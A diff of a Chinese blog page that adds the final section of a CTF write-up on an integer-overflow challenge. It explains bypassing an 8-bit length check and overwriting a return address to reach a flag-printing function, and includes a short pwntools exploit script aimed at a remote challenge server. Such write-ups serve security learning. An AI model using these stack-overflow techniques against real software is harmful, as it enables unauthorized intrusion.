@@ -29,8 +29,10 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2021/03/10/AD-int-overflow/1.png">
 <meta property="og:image" content="http://example.com/2021/03/10/AD-int-overflow/2.png">
+<meta property="og:image" content="http://example.com/2021/03/10/AD-int-overflow/3.png">
+<meta property="og:image" content="http://example.com/2021/03/10/AD-int-overflow/4.png">
 <meta property="article:published_time" content="2021-03-10T05:48:26.000Z">
-<meta property="article:modified_time" content="2021-03-10T08:21:27.485Z">
+<meta property="article:modified_time" content="2021-03-14T02:41:51.687Z">
 <meta property="article:author" content="带废物">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
@@ -182,10 +184,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2021-03-10 13:48:26 / Modified: 16:21:27" itemprop="dateCreated datePublished" datetime="2021-03-10T13:48:26+08:00">2021-03-10</time>
+              <time title="Created: 2021-03-10 13:48:26" itemprop="dateCreated datePublished" datetime="2021-03-10T13:48:26+08:00">2021-03-10</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-03-14 10:41:51" itemprop="dateModified" datetime="2021-03-14T10:41:51+08:00">2021-03-14</time>
+              </span>
 
           
 
@@ -242,6 +250,13 @@
 <p>v3用于存储s的长度</p>
 <p>unsigned _ int8 v3;代表v3的大小为8位，即能存储的数字范围为0到255，256相当于0，257相当于1。</p>
 <p>也就是说，如果s字符串的长度在259到264之间，也能通过if。</p>
+<h2 id="覆盖"><a href="#覆盖" class="headerlink" title="覆盖"></a>覆盖</h2><img src="/2021/03/10/AD-int-overflow/3.png" class>
+<img src="/2021/03/10/AD-int-overflow/4.png" class>
+<p>这里涉及字符串拷贝，拷贝的目的地在栈中，栈长度为14h+4h</p>
+<p>只要通过溢出覆盖check-passwd函数的返回地址，返回到what is this函数去执行里面的代码，就可以得到我们需要的flag</p>
+<p>第一步<br>4h+4h=20D+4D=24 覆盖掉用于拷贝的栈24个字节<br>第二步<br>跳转到what is this的地址 p32（0x0804868B）<br>p32大小为4个字节，至此已输入了28个字节<br>第三步<br>补充字节直到密码长度为259到264之间</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">47792</span>)</span><br><span class="line">flag = <span class="number">0x0804868B</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your username:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;your father&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your passwd:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">24</span> + p32(flag) + <span class="string">&quot;a&quot;</span>*<span class="number">232</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>完结撒花</p>
 
     </div>
 
@@ -322,7 +337,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E8%B7%9D%E7%A6%BB"><span class="nav-number">1.</span> <span class="nav-text">溢出距离</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%B8%AD%E7%9A%84%E6%BA%A2%E5%87%BA"><span class="nav-number">2.</span> <span class="nav-text">题目中的溢出</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E8%B7%9D%E7%A6%BB"><span class="nav-number">1.</span> <span class="nav-text">溢出距离</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%B8%AD%E7%9A%84%E6%BA%A2%E5%87%BA"><span class="nav-number">2.</span> <span class="nav-text">题目中的溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A6%86%E7%9B%96"><span class="nav-number">3.</span> <span class="nav-text">覆盖</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
